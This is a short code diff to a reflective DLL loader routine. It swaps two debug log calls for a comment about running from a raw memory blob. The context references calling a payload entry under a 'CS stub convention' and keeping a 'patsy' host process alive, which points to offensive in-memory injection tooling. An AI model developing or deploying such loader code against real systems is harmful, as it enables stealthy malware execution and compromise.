@@ -1443,10 +1443,11 @@ ReflectiveLoader(LPVOID param)
         entry = rl_resolve(newbase, hDM);
         if (!entry) entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
     }
-    vpn_dbg("loader: calling DllMain");
+    /* NOTE: no vpn_dbg here - the loader runs from the raw blob where
+     * rip-relative string literals are invalid; markers only run in the
+     * mapped image below. */
     ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
         (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);
-    vpn_dbg("loader: DllMain returned");
 
     /* CS stub convention: rax is called as the payload entry after the
      * loader returns - park the calling thread so the patsy stays alive
